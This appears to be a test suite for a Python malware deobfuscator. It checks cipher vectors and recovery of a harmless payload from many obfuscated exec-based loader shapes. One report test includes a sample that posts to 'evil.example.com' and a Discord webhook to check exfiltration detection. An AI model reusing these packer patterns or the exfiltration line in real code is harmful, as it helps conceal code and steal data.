"""7.3.0 gates: the decoder matrix — ciphers, encodings and loader shapes.

Every sample here is *generated inside the gate* from a known payload, so the
comparison is against ground truth and never against pydecomp's own output.  The
crypto primitives are pinned to published vectors (FIPS-197, NIST SP 800-38A,
RFC 8439, RFC 9285) because a pure-python AES that is subtly wrong is worse
than no AES at all: it would "recover" garbage and call it a payload.
"""
import ast
import base64
import hashlib
import hmac
import lzma
import marshal
import os
import sys
import tempfile
import textwrap
import zlib

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
import pydecomp as P                                              # noqa: E402

FAILED = []
CHECKS = []

PAYLOAD = textwrap.dedent('''
    def main():
        print("payload running")

    if __name__ == "__main__":
        main()
''').strip() + "\n"
RAW = PAYLOAD.encode()
ZL = zlib.compress(RAW, 9)


def check(name):
    def wrap(fn):
        CHECKS.append(name)
        try:
            fn()
            print(f"ok    {name}")
        except Exception as exc:                                # noqa: BLE001
            FAILED.append(name)
            print(f"FAIL  {name}\n      {type(exc).__name__}: {exc}")
        return fn
    return wrap


def eq(got, want, label=""):
    assert got == want, f"{label}: got {got!r}, want {want!r}"


def ok(cond, label=""):
    assert cond, label or "condition failed"


def recovered(source: str) -> P.Artifact:
    return P.dig(source.encode(), "packer.py")


def recovers(source: str, label=""):
    artifact = recovered(source)
    ok(PARSES(artifact.text), f"{label}: not Python\n{artifact.text[:300]}")
    ok("payload running" in artifact.text, f"{label}: payload missing\n{artifact.text[:300]}")
    return artifact


def PARSES(text):
    try:
        ast.parse(text)
    except SyntaxError:
        return False
    return True


# ---------------------------------------------------------------- vectors
@check("AES block cipher matches FIPS-197 (128/192/256)")
def _aes_vectors():
    plain = bytes.fromhex("00112233445566778899aabbccddeeff")
    for size, expected in ((16, "69c4e0d86a7b0430d8cdb78070b4c55a"),
                           (24, "dda97ca4864cdfe06eaf70a0ec0d7191"),
                           (32, "8ea2b7ca516745bfeafc49904b496089")):
        key = bytes(range(size))
        eq(P.AES(key).encrypt_block(plain).hex(), expected, f"aes-{size * 8}")
        eq(P.AES(key).decrypt_block(bytes.fromhex(expected)), plain, f"aes-{size * 8} decrypt")


@check("AES-CBC matches NIST SP 800-38A")
def _cbc_vector():
    key = bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c")
    iv = bytes.fromhex("000102030405060708090a0b0c0d0e0f")
    plain = bytes.fromhex("6bc1bee22e409f96e93d7e117393172a")
    eq(P.cbc_encrypt(key, iv, plain)[:16].hex(), "7649abac8119b246cee98e9b12e9197d", "cbc")
    eq(P.cbc_decrypt(key, iv, P.cbc_encrypt(key, iv, plain)), plain, "cbc round trip")


@check("AES-GCM matches the NIST vectors and rejects a bad tag")
def _gcm_vectors():
    eq(P.gcm_encrypt(bytes(16), bytes(12), b"").hex(), "58e2fccefa7e3061367f1d57a4e7455a", "tag")
    sealed = P.gcm_encrypt(bytes(16), bytes(12), bytes(16))
    eq(sealed.hex(), "0388dace60b6a392f328c2b971b2fe78ab6e47d42cec13bdf53a67b21257bddf", "ct")
    eq(P.gcm_decrypt(bytes(16), bytes(12), sealed), bytes(16), "open")
    bad = sealed[:-1] + bytes([sealed[-1] ^ 1])
    try:
        P.gcm_decrypt(bytes(16), bytes(12), bad)
    except ValueError:
        return
    raise AssertionError("a corrupted GCM tag was accepted")


@check("ChaCha20 and Poly1305 match RFC 8439")
def _chacha_vectors():
    key = bytes(range(32))
    nonce = bytes.fromhex("000000000000004a00000000")
    plain = (b"Ladies and Gentlemen of the class of '99: If I could offer you "
             b"only one tip for the future, sunscreen would be it.")
    eq(P.chacha20_xor(key, nonce, plain, counter=1)[:16].hex(),
       "6e2e359a2568f98041ba0728dd0d6981", "chacha20")
    mac_key = bytes.fromhex("85d6be7857556d337f4452fe42d506a8"
                            "0103808afb0db2fd4abff6af4149f51b")
    eq(P.poly1305_mac(b"Cryptographic Forum Research Group", mac_key).hex(),
       "a8061dc1305136c6c22b8baf0c0127a9", "poly1305")


@check("ChaCha20-Poly1305 AEAD matches RFC 8439 section 2.8.2")
def _aead_vector():
    key = bytes(range(0x80, 0xA0))
    nonce = bytes.fromhex("070000004041424344454647")
    aad = bytes.fromhex("50515253c0c1c2c3c4c5c6c7")
    plain = (b"Ladies and Gentlemen of the class of '99: If I could offer you "
             b"only one tip for the future, sunscreen would be it.")
    sealed = P.chacha20poly1305_seal(key, nonce, plain, aad)
    eq(sealed[:16].hex(), "d31a8d34648e60db7b86afbc53ef7ec2", "ct")
    eq(sealed[-16:].hex(), "1ae10b594f09e26a7e902ecbd0600691", "tag")
    eq(P.chacha20poly1305_open(key, nonce, sealed, aad), plain, "open")


@check("RC4, base58 and base45 match their published vectors")
def _encoding_vectors():
    eq(P.rc4(b"Key", b"Plaintext").hex(), "bbf316e8d940af0ad3", "rc4")
    eq(P.b58decode(b"16UjcYNBG9GTK4uq2f7yYEbuifqCzoLMGS").hex(),
       "003c176e659bea0f29a3e9bf7880c112b1b31b4dc826268187", "base58")
    eq(P.b45decode(b"BB8"), b"BA", "base45")


@check("repeating-XOR keys are recovered, including awkward ones")
def _xor_recovery():
    for key in (b"\x37", b"k3y", b"zZ9", b"nasa2026"):
        plain = (b'print("xor layer recovered")\n' * 12)
        sealed = bytes(b ^ key[i % len(key)] for i, b in enumerate(plain))
        found, out = P.xor_best(sealed, max_key=16)
        eq(out, plain, f"key {key!r}")
        eq(found, key, f"key {key!r}")


# ---------------------------------------------------------------- packers
@check("packer: AES-GCM + zlib + base85 (the All-nasa / masu shape)")
def _pack_aesgcm():
    key, nonce = bytes(range(32)), bytes(range(12))
    sealed = P.gcm_encrypt(key, nonce, ZL)
    recovers(f'''import zlib, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
_k = base64.b85decode({base64.b85encode(key)!r})
_n = base64.b85decode({base64.b85encode(nonce)!r})
_c = base64.b85decode({base64.b85encode(sealed)!r})
exec(zlib.decompress(AESGCM(_k).decrypt(_n, _c, None)).decode())
''', "aesgcm")


@check("packer: Fernet token")
def _pack_fernet():
    key = bytes(range(32))
    iv = bytes(range(16))
    body = P.cbc_encrypt(key[16:], iv, ZL)
    token = b"\x80" + (0).to_bytes(8, "big") + iv + body
    token += hmac.new(key[:16], token, hashlib.sha256).digest()
    token = base64.urlsafe_b64encode(token)
    recovers(f'''from cryptography.fernet import Fernet
import zlib
exec(zlib.decompress(Fernet({base64.urlsafe_b64encode(key)!r}).decrypt({token!r})))
''', "fernet")


@check("packer: pycryptodome AES-CBC over base64")
def _pack_pycryptodome():
    key, iv = bytes(range(16)), bytes(range(16, 32))
    body = base64.b64encode(P.cbc_encrypt(key, iv, ZL))
    recovers(f'''import base64, zlib
from Crypto.Cipher import AES
cipher = AES.new({key!r}, AES.MODE_CBC, {iv!r})
exec(zlib.decompress(cipher.decrypt(base64.b64decode({body!r}))))
''', "pycryptodome")


@check("packer: ChaCha20-Poly1305")
def _pack_chacha():
    key, nonce = bytes(range(32)), bytes(range(12))
    sealed = P.chacha20poly1305_seal(key, nonce, ZL)
    recovers(f'''import zlib
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
c = ChaCha20Poly1305({key!r})
exec(zlib.decompress(c.decrypt({nonce!r}, {sealed!r}, b"")))
''', "chacha20poly1305")


@check("packer: cryptography low-level Cipher(...).decryptor()")
def _pack_lowlevel():
    key = bytes(range(16))
    body = P.ctr_block_xor(P.AES(key), bytes(16), ZL)
    recovers(f'''import zlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
d = Cipher(algorithms.AES({key!r}), modes.CTR({bytes(16)!r})).decryptor()
exec(zlib.decompress(d.update({body!r}) + d.finalize()))
''', "lowlevel")


@check("packer: PBKDF2-derived key")
def _pack_pbkdf2():
    salt = b"pydecomp-salt"
    key = hashlib.pbkdf2_hmac("sha256", b"passphrase", salt, 1000, 32)
    nonce = bytes(12)
    sealed = P.gcm_encrypt(key, nonce, ZL)
    recovers(f'''import hashlib, zlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = hashlib.pbkdf2_hmac("sha256", b"passphrase", {salt!r}, 1000, 32)
exec(zlib.decompress(AESGCM(key).decrypt({nonce!r}, {sealed!r}, None)))
''', "pbkdf2")


@check("packer: a hand-written RC4 loader function")
def _pack_rc4():
    key = b"s3cret-key"
    body = P.rc4(key, ZL)
    recovers(f'''import zlib
def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)
exec(zlib.decompress(rc4({key!r}, {body!r})))
''', "rc4")


@check("packer: repeating XOR over base64")
def _pack_xor():
    key = b"nasa2026"
    body = bytes(b ^ key[i % len(key)]
                 for i, b in enumerate(base64.b64encode(ZL)))
    recovers(f'''import base64, zlib
blob = {body!r}
key = {key!r}
raw = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
exec(zlib.decompress(base64.b64decode(raw)))
''', "xor")


@check("packer: chr() stream built by a loop")
def _pack_chr_loop():
    recovers(f'''codes = {list(RAW)!r}
chars = []
for c in codes:
    chars.append(chr(c))
exec("".join(chars))
''', "chr-loop")


@check("packer: exec alias + getattr indirection")
def _pack_aliases():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib
e = exec
d = getattr(zlib, "decompress")
b = base64.b64decode
e(d(b({body!r})))
''', "aliases")


@check("packer: raw deflate behind hex")
def _pack_raw():
    obj = zlib.compressobj(9, zlib.DEFLATED, -15)
    body = obj.compress(ZL) + obj.flush()
    recovers(f'''import zlib
exec(zlib.decompress(bytes.fromhex({body.hex()!r}), -15))
''', "raw-deflate")


@check("packer: lzma-alone stream")
def _pack_lzma():
    body = lzma.compress(ZL, format=lzma.FORMAT_ALONE)
    recovers(f'''import lzma
exec(lzma.decompress({body!r}))
''', "lzma-alone")


@check("packer: marshal code object behind compile()")
def _pack_marshal():
    blob = zlib.compress(marshal.dumps(compile(RAW, "<p>", "exec")), 9)
    artifact = recovered(f'''import base64, zlib, marshal
p = zlib.decompress(base64.b64decode({base64.b64encode(blob)!r}))
code = compile(marshal.loads(p), "<p>", "exec")
exec(code)
''')
    ok("payload running" in artifact.text, artifact.text[:300])
    ok("def main()" in artifact.text, artifact.text[:300])


# ------------------------------------------------------- loader shapes (7.4.0)
@check("loader: try/except fallback chain inside a function")
def _pack_try():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib, bz2
def dec(s):
    try:
        return zlib.decompress(s)
    except Exception:
        try:
            return bz2.decompress(s)
        except Exception:
            return zlib.decompress(base64.b64decode(s))
exec(dec({body!r}))
''', "try-fallback")


@check("loader: while True with break and continue")
def _pack_while():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib
data = {body!r}
chunks = []
i = 0
while True:
    if i >= len(data):
        break
    if data[i:i + 1] == b"!":
        i += 1
        continue
    chunks.append(data[i:i + 8])
    i += 8
exec(zlib.decompress(base64.b64decode(b"".join(chunks))))
''', "while-break")


@check("loader: *args / **kwargs function")
def _pack_varargs():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib
def dec(*parts, **kw):
    raw = b"".join(parts)
    return zlib.decompress(base64.b64decode(raw))
exec(dec({body[:20]!r}, {body[20:]!r}))
''', "varargs")


@check("loader: class with __init__ and a method")
def _pack_class():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib
class Loader:
    def __init__(self, data):
        self.data = data
    def run(self):
        return zlib.decompress(base64.b64decode(self.data))
exec(Loader({body!r}).run())
''', "class-loader")


@check("loader: globals() lookup through a dict subscript")
def _pack_globals():
    body = base64.b64encode(ZL)
    recovers(f'''import base64, zlib
_blob = {body!r}
exec(zlib.decompress(base64.b64decode(globals()["_blob"])))
''', "globals-lookup")


@check("the recovered payload of every shape compiles")
def _all_compile():
    for text in (f"exec(zlib.decompress(bytes.fromhex('{zlib.compress(RAW).hex()}')))",):
        artifact = recovered(text)
        eq(P.compile_problem(artifact.text), None, "compile problem")
# ---------------------------------------------------------------- v8 gates
# runtime name resolution (items 1-5): every way an obfuscator hides "exec"


@check("names: globals() subscript, escaped literal")
def _names_globals():
    recovers(f'''import base64, zlib
globals()["\\x65xec"](zlib.decompress(base64.b64decode({base64.b64encode(ZL)!r})))
''', "name-globals")


@check("names: __builtins__ dict and getattr")
def _names_builtins():
    body = repr(base64.b64encode(ZL))
    recovers(f'''import base64, zlib
__builtins__["exec"](zlib.decompress(base64.b64decode({body})))
''', "builtins-dict")
    recovers(f'''import base64, zlib
getattr(__builtins__, "exec")(zlib.decompress(base64.b64decode({body})))
''', "builtins-getattr")


@check("names: computed identifier (chr shifts, join)")
def _names_computed():
    shift = lambda text, n: "".join(chr(ord(c) + n) for c in text)
    recovers(f'''import base64, zlib
f = "".join([chr(ord(i) - 3) for i in {shift("exec", 3)!r}])
d = "".join([chr(ord(i) - 3) for i in {shift(base64.b64encode(ZL).decode(), 3)!r}])
getattr(__builtins__, f)(zlib.decompress(base64.b64decode(d)))
''', "name-computed")


@check("names: list and dict dispatch to a callable")
def _names_dispatch():
    body = repr(base64.b64encode(ZL))
    recovers(f'''import base64, zlib
[exec][0](zlib.decompress(base64.b64decode({body})))
''', "dispatch-list")
    recovers(f'''import base64, zlib, bz2
table = {{0: lambda b: zlib.decompress(b), 1: lambda b: bz2.decompress(b)}}
exec(table[0](base64.b64decode({body})))
''', "dispatch-table")


@check("names: functools.partial and a lambda default argument")
def _names_partial():
    body = repr(base64.b64encode(ZL))
    recovers(f'''import functools, base64, zlib
run = functools.partial(exec)
run(zlib.decompress(base64.b64decode({body})))
''', "partial")
    recovers(f'''import base64, zlib
f = lambda d={body}: exec(zlib.decompress(base64.b64decode(d)))
f()
''', "lambda-default")


@check("payload: marshal inside a dict inside marshal")
def _marshal_wrapped():
    inner = marshal.dumps(compile(RAW, "<g>", "exec"))
    outer = marshal.dumps({"m": inner})
    recovers(f'''import marshal
blob = {zlib.decompress(zlib.compress(outer, 9))!r}
exec(marshal.loads(marshal.loads(blob)["m"]))
''', "marshal-wrapped")


@check("payload: header-stripped marshal (pyc layout without a header)")
def _marshal_header():
    blob = b"\x00" * 16 + marshal.dumps(compile(RAW, "<h>", "exec"))
    recovers(f'''import marshal
data = {blob!r}
exec(marshal.loads(data[16:]))
''', "marshal-header")


@check("encoding: 256-symbol emoji alphabet")
def _emoji_alpha():
    alphabet = [chr(0x1F400 + i) for i in range(256)]
    text = "".join(alphabet[b] for b in ZL)
    recovered_text = recovered(
        f"import zlib\nA = {alphabet!r}\ns = {text!r}\n"
        "raw = bytes(A.index(c) for c in s)\nexec(zlib.decompress(raw))\n").text
    eq("payload running" in recovered_text, True, "emoji payload")


@check("encoding: emoji quads (2 bits per symbol)")
def _emoji_quad():
    symbols = ["\U0001F170", "\U0001F171", "\U0001F17E", "\U0001F18E"]
    encoded = "".join(symbols[(byte >> shift) & 3]
                      for byte in ZL for shift in (6, 4, 2, 0))
    recovered_text = recovered(f'''import zlib
em = {symbols!r}
s = {encoded!r}
out = bytearray()
for i in range(0, len(s), 4):
    q = [em.index(c) for c in s[i:i + 4]]
    out.append((q[0] << 6) | (q[1] << 4) | (q[2] << 2) | q[3])
exec(zlib.decompress(bytes(out)))
''').text
    eq("payload running" in recovered_text, True, "emoji-quad payload")


@check("cipher: DES-CBC via the pycryptodome API")
def _des_cbc():
    raw = RAW + bytes([16 - len(RAW) % 16]) * (16 - len(RAW) % 16)
    subkeys = P._des_subkeys(b"8bytekey")
    previous, out = b"initvect", b""
    for offset in range(0, len(raw), 8):
        block = bytes(a ^ b for a, b in zip(raw[offset:offset + 8], previous))
        previous = P._des_block(block, subkeys, False)
        out += previous
    recovers(f'''from Crypto.Cipher import DES
import base64
c = DES.new(b"8bytekey", DES.MODE_CBC, b"initvect")
exec(c.decrypt(base64.b64decode({base64.b64encode(out)!r})))
''', "des-cbc")


@check("cipher: DES primitive matches FIPS 46-3 vectors")
def _des_vectors():
    # known answer: key 0x00*8, plaintext 0x00*8 -> 8ca64de9c1b123a7
    eq(P.des_ecb_decrypt(b"\x00" * 8, bytes.fromhex("8ca64de9c1b123a7"), unpad=False).hex(),
       "00" * 8, "DES known answer")
    # 3DES with K1=K2=K3 must collapse to single DES
    eq(P.des3_cbc_decrypt(b"\x00" * 24, b"\x00" * 8,
                          bytes.fromhex("8ca64de9c1b123a7"), unpad=False).hex(),
       "00" * 8, "3DES degenerate key")


@check("container: tar.gz with a python member")
def _tar_container():
    import io
    import tarfile
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        info = tarfile.TarInfo("pkg/__init__.py")
        info.size = len(RAW)
        archive.addfile(info, io.BytesIO(RAW))
    eq("payload running" in P.dig(buffer.getvalue(), "t.tar.gz").text, True,
       "tar member recovered")


@check("polish: decoder-ring identifiers are renamed, originals kept")
def _polish_demangle():
    source = "lIIllIlI = 1\nIlIlIlI = lIIllIlI + 1\nprint(IlIlIlI)\n"
    polished, notes = P.polish_source(source)
    code = "\n".join(line for line in polished.splitlines()
                     if not line.lstrip().startswith("#"))
    eq("lIIllIlI" in code, False, "renamed away")
    eq("lIIllIlI" in polished, True, "legend keeps the original")
    eq("print(" in polished, True, "still code")
    eq(bool(notes), True, "notes recorded")


@check("polish: dead branches and constant folding")
def _polish_dead():
    source = "if 1 == 1:\n    x = 'a' + 'b'\nelse:\n    x = 'nope'\nprint(x)\n"
    polished, _ = P.polish_source(source)
    eq("nope" in polished, False, "dead branch removed")
    eq("'ab'" in polished or '\"ab\"' in polished, True, "constant folded")


@check("report: indicators and behaviour come out of the recovered file")
def _report_iocs():
    source = ('import os, requests\n'
              'URL = "http://evil.example.com/gate.php"\n'
              'HOOK = "https://discord.com/api/webhooks/123/abcdefghij"\n'
              'requests.post(URL)\n')
    report = P.analyse_recovered(source)
    eq("url" in report["iocs"], True, "url found")
    eq("webhook" in report["iocs"], True, "webhook found")
    eq("exfil" in report["risks"], True, "behaviour flagged")
    eq(bool(report["fingerprint"]), True, "fingerprint present")


@check("report: pyarmor wrapper is identified, never guessed at")
def _report_pyarmor():
    source = "from pyarmor_runtime_000000 import __pyarmor__\n__pyarmor__(__name__, __file__, b'\\x50')\n"
    note = P.pyarmor_note(source)
    eq(isinstance(note, str), True, "note produced")
    eq("PyArmor" in note, True, "named")
    eq("without the matching" in note, True, "honest about key material")


@check("report: runnability check is static - it never runs the sample")
def _static_verify():
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as handle:
        handle.write("print('hi')\n")
        path = handle.name
    try:
        ok, why = P._exec_dry_run(path)
        eq(ok, True, "clean file passes")
        with open(path, "w") as handle:
            handle.write("raise SystemExit(3)\nundefined_name()\n")
        ok2, why2 = P._exec_dry_run(path)
        eq(ok2, False, "missing name caught")
        eq("undefined_name" in why2, True, "named in the report")
        with open(path, "w") as handle:
            handle.write("def broken(:\n")
        ok3, _ = P._exec_dry_run(path)
        eq(ok3, False, "syntax error caught")
    finally:
        os.unlink(path)


@check("deep mode raises the layer ceiling without changing results")
def _deep_mode():
    before = P.MAX_LAYERS
    P._deep_mode()
    eq(P.MAX_LAYERS >= before, True, "ceiling only grows")
    eq(P._DEEP["on"], True, "flag set")


if __name__ == "__main__":
    print()
    if FAILED:
        print(f"{len(FAILED)} failed: {', '.join(FAILED)}")
        raise SystemExit(1)
    print(f"all {len(CHECKS)} checks passed")
